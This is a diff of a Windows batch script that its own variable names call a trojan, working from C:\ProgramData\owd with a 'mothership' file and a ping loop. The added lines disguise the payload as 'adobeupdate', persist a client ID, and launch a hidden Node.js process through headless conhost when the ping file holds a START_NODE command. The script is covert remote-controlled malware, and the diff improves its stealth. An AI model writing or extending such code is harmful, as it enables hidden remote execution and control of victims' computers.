@@ -4,6 +4,8 @@ SET "trojandir=C:\ProgramData\owd"
 
 cd /d %trojandir%
 
+set trojanfname=adobeupdate
+
 set clientid=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
 
 IF EXIST %trojandir%\client_id (
@@ -12,6 +14,9 @@ IF EXIST %trojandir%\client_id (
 
 set clientid=%clientid:~0,8%
 
+IF NOT EXIST %trojandir%\client_id (
+    echo %clientid% > %trojandir%\client_id
+)    
 
 echo %USERNAME% > %trojandir%\username
 SET /P tusername=<%trojandir%\username
@@ -78,6 +83,7 @@ IF NOT EXIST %trojandir%\mothership (
     echo %mothership% > %trojandir%\mothership
 )
 
+SET nodepath=C:\ProgramData\owd\node\node-v26.4.0-win-x64\node.exe
 
 set dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
 
@@ -125,10 +131,13 @@ exit 1
     
     REM check if START_NODE present, if so launch adobeupdate
     
-    type %trojandir%\%pingfname% | findstr START_NODE
+    type %trojandir%\%pingfname% | findstr /I start_node
+
+    %nodepath% --version >> %logfpath%
 
     IF "%errorlevel%"=="0" (
-        conhost.exe --headless C:\ProgramData\owd\node\node.exe C:\ProgramData\owd\adobeupdate launch_ping
+        echo  starting node launch_ping >> %logfpath%
+        start "" /min conhost.exe --headless %nodepath% %trojandir%\%trojanfname% launch_ping
     )
 
     echo pingloop sleeping %pingdelaytime% >> %logfpath%
